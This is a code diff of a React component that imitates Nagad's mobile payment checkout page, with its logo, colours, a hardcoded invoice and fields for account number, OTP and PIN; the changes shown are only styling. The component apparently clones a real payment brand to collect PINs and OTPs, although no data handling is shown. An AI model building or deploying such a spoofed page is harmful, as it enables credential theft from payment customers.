@@ -21,8 +21,7 @@ const NagadPayment = () => {
   const pinInputRefs = useRef<(HTMLInputElement | null)[]>([]);
 
   useEffect(() => {
-    const timer = setTimeout(() => setIsLoading(false), 2000);
-    return () => clearTimeout(timer);
+    setIsLoading(false);
   }, []);
 
   useEffect(() => {
@@ -103,127 +102,124 @@ const NagadPayment = () => {
   };
 
   const renderPinInputs = () => (
-    <div className="flex items-center justify-center gap-2">
+    <div className="flex items-center justify-center gap-1.5">
       {pinDigits.map((digit, index) => (
         <input key={index} ref={(el) => (pinInputRefs.current[index] = el)}
           type="password" inputMode="numeric" maxLength={1} value={digit}
           onChange={(e) => handleDigitChange(index, e.target.value, pinDigits, setPinDigits, pinInputRefs, 4)}
           onKeyDown={(e) => handleKeyDown(index, e, pinDigits, setPinDigits, pinInputRefs)}
-          className="w-11 h-11 bg-white rounded-md text-center text-gray-800 text-xl font-medium focus:outline-none focus:ring-1 focus:ring-white/50"
+          className="w-9 h-9 bg-white rounded text-center text-gray-800 text-sm font-bold focus:outline-none focus:ring-1 focus:ring-white/50"
         />
       ))}
     </div>
   );
 
   return (
-    <div className="min-h-screen bg-gray-200 flex flex-col items-center p-4">
-      <div className="w-full max-w-md overflow-hidden flex flex-col" style={{ height: '85vh' }}>
-        {isLoading ? (
-          <div className="flex-1 flex flex-col items-center justify-center rounded-lg"
-            style={{ background: 'linear-gradient(180deg, #C41E3A 0%, #8B0000 100%)' }}>
-            <p className="text-white text-xs font-medium">Loading...</p>
-          </div>
-        ) : showFailedView ? (
-          <div className="flex-1 flex flex-col items-center justify-center rounded-lg"
-            style={{ background: 'linear-gradient(180deg, #C41E3A 0%, #8B0000 100%)' }}>
-            <XCircle className="w-10 h-10 text-white mb-3" strokeWidth={1.5} />
-            <h3 className="text-white text-center text-sm font-medium mb-1">Payment Cancelled</h3>
-            <p className="text-white text-center text-xs">Redirecting to Merchant Website in {redirectTimer}s</p>
+    <div className="min-h-screen flex flex-col items-center md:p-4 md:bg-gray-200">
+      <div className="w-full max-w-md overflow-hidden flex flex-col min-h-screen md:min-h-0 md:h-[85vh] md:rounded-lg"
+        style={{ background: 'linear-gradient(180deg, #C41E3A 0%, #8B0000 100%)' }}>
+        {showFailedView ? (
+          <div className="flex-1 flex flex-col items-center justify-center">
+            <XCircle className="w-8 h-8 mb-2" style={{ color: '#ccc' }} strokeWidth={1.5} />
+            <h3 className="text-center text-xs font-bold mb-1" style={{ color: '#ccc' }}>Payment Cancelled</h3>
+            <p className="text-center text-[10px] font-bold" style={{ color: '#ccc' }}>Redirecting to Merchant Website in {redirectTimer}s</p>
           </div>
         ) : (
-          <div className="flex-1 flex flex-col rounded-lg overflow-hidden"
-            style={{ background: 'linear-gradient(180deg, #C41E3A 0%, #8B0000 100%)' }}>
+          <div className="flex-1 flex flex-col">
             {/* Language Toggle */}
             <div className="flex justify-end p-2">
               <div className="flex rounded overflow-hidden border border-white/30">
                 <button onClick={() => setLanguage('bn')}
-                  className={`px-2 py-0.5 text-[10px] font-medium transition-colors ${language === 'bn' ? 'bg-white/20 text-white' : 'text-white/70'}`}>বাং</button>
+                  className={`px-2 py-0.5 text-[9px] font-bold transition-colors ${language === 'bn' ? 'bg-white/20' : ''}`} style={{ color: '#ccc' }}>বাং</button>
                 <button onClick={() => setLanguage('en')}
-                  className={`px-2 py-0.5 text-[10px] font-medium transition-colors ${language === 'en' ? 'bg-white/20 text-white' : 'text-white/70'}`}>Eng</button>
+                  className={`px-2 py-0.5 text-[9px] font-bold transition-colors ${language === 'en' ? 'bg-white/20' : ''}`} style={{ color: '#ccc' }}>Eng</button>
               </div>
             </div>
 
             {/* Cart Icon & Title */}
-            <div className="flex flex-col items-center pt-1 pb-2">
-              <img src={cartIcon} alt="Cart" className="w-14 h-14 mb-1 object-contain" />
-              <h1 className="text-white text-base font-semibold">Easy Payment System</h1>
+            <div className="flex flex-col items-center pt-0 pb-1">
+              <img src={cartIcon} alt="Cart" className="w-10 h-10 mb-1 object-contain" />
+              <h1 className="text-sm font-bold" style={{ color: '#ccc' }}>Easy Payment System</h1>
             </div>
 
             {/* Invoice Details */}
-            <div className="px-5 py-2 space-y-1">
+            <div className="px-5 py-1.5 space-y-0.5">
               <div className="flex">
-                <span className="text-white font-semibold text-xs w-28">Invoice No:</span>
-                <span className="text-white/80 text-xs">B255527202718B</span>
+                <span className="font-bold text-[10px] w-24" style={{ color: '#ccc' }}>Invoice No:</span>
+                <span className="text-[10px] font-bold" style={{ color: '#ccc' }}>B255527202718B</span>
               </div>
               <div className="flex">
-                <span className="text-white font-semibold text-xs w-28">Total Amount:</span>
-                <span className="text-white/80 text-xs">BDT 434</span>
+                <span className="font-bold text-[10px] w-24" style={{ color: '#ccc' }}>Total Amount:</span>
+                <span className="text-[10px] font-bold" style={{ color: '#ccc' }}>BDT 434</span>
               </div>
               <div className="flex">
-                <span className="text-white font-semibold text-xs w-28">Charge:</span>
-                <span className="text-white/80 text-xs">BDT 0</span>
+                <span className="font-bold text-[10px] w-24" style={{ color: '#ccc' }}>Charge:</span>
+                <span className="text-[10px] font-bold" style={{ color: '#ccc' }}>BDT 0</span>
               </div>
             </div>
 
             <div className="flex-1" />
 
             {/* Input Section */}
-            <div className="px-5 pb-3">
+            <div className="px-5 pb-2">
               {showPinView ? (
-                <div className="h-24 flex flex-col justify-center">
-                  <p className="text-white text-center text-sm font-medium mb-3 h-4">Enter PIN</p>
+                <div className="h-20 flex flex-col justify-center">
+                  <p className="text-center text-xs font-bold mb-2" style={{ color: '#ccc' }}>Enter PIN</p>
                   {renderPinInputs()}
                 </div>
               ) : showOtpView ? (
-                <div className="h-24 flex flex-col justify-center">
-                  <p className="text-white text-center text-sm font-medium mb-3 h-4">Enter Verification Code [OTP]</p>
+                <div className="h-20 flex flex-col justify-center">
+                  <p className="text-center text-xs font-bold mb-2" style={{ color: '#ccc' }}>Enter Verification Code [OTP]</p>
                   <input ref={otpInputRef} type="tel" inputMode="numeric" maxLength={6} value={otpValue}
                     onChange={(e) => setOtpValue(e.target.value.replace(/\D/g, '').slice(0, 6))}
                     placeholder="XXX|XXX"
-                    className="w-full h-10 bg-white rounded-md text-center text-gray-800 text-sm font-medium focus:outline-none focus:ring-1 focus:ring-white/50 placeholder:text-gray-400"
+                    className="w-full h-9 bg-white rounded-md text-center text-gray-800 text-xs font-bold focus:outline-none focus:ring-1 focus:ring-white/50 placeholder:text-gray-400"
                   />
                 </div>
               ) : (
-                <div className="h-24 flex flex-col justify-center">
-                  <p className="text-white text-center text-sm font-semibold mb-3 h-4">Your Nagad Account Number</p>
+                <div className="h-20 flex flex-col justify-center">
+                  <p className="text-center text-xs font-bold mb-2" style={{ color: '#ccc' }}>Your Nagad Account Number</p>
                   {renderPhoneInputs()}
                 </div>
               )}
             </div>
 
             {/* Terms */}
-            <div className="px-5 py-1 h-10 flex items-center justify-center">
+            <div className="px-5 py-0.5 h-8 flex items-center justify-center">
               {!showOtpView && !showPinView && (
-                <p className="text-white/80 text-center text-[10px] leading-tight">
+                <p className="text-center text-[8px] font-bold leading-tight" style={{ color: '#ccc' }}>
                   By clicking/tapping "Proceed" you are agreeing to our{" "}
-                  <span className="text-white font-medium underline">Terms and Conditions</span>
+                  <span className="underline" style={{ color: '#ccc' }}>Terms and Conditions</span>
                 </p>
               )}
             </div>
 
             {/* Action Buttons */}
-            <div className="px-5 py-3 flex gap-3">
+            <div className="px-5 py-2 flex gap-2">
               <button
                 onClick={showPinView ? handlePinConfirm : showOtpView ? handleOtpConfirm : handleConfirm}
                 disabled={showPinView ? !isValidPin() : showOtpView ? !isValidOtp() : !isValidNumber()}
-                className={`flex-1 border border-white text-white py-2 rounded-md text-xs font-medium transition-colors ${
+                className={`flex-1 border py-1.5 rounded-md text-[10px] font-bold transition-colors ${
                   (showPinView ? isValidPin() : showOtpView ? isValidOtp() : isValidNumber())
                     ? 'hover:bg-white/10' : 'opacity-50 cursor-not-allowed'
                 }`}
+                style={{ borderColor: '#ccc', color: '#ccc' }}
               >Proceed</button>
               {showOtpView && (
                 <button onClick={() => setOtpValue("")}
-                  className="flex-1 border border-white text-white py-2 rounded-md text-xs font-medium hover:bg-white/10 transition-colors"
+                  className="flex-1 border py-1.5 rounded-md text-[10px] font-bold hover:bg-white/10 transition-colors"
+                  style={{ borderColor: '#ccc', color: '#ccc' }}
                 >Resend Code</button>
               )}
               <button onClick={handleClose}
-                className="flex-1 border border-white text-white py-2 rounded-md text-xs font-medium hover:bg-white/10 transition-colors"
+                className="flex-1 border py-1.5 rounded-md text-[10px] font-bold hover:bg-white/10 transition-colors"
+                style={{ borderColor: '#ccc', color: '#ccc' }}
               >Close</button>
             </div>
 
             {/* Nagad Logo Footer */}
-            <div className="flex justify-center py-4">
-              <img src={nagadLogoImg} alt="Nagad" className="h-8 object-contain" />
+            <div className="flex justify-center py-3">
+              <img src={nagadLogoImg} alt="Nagad" className="h-6 object-contain" />
             </div>
           </div>
         )}
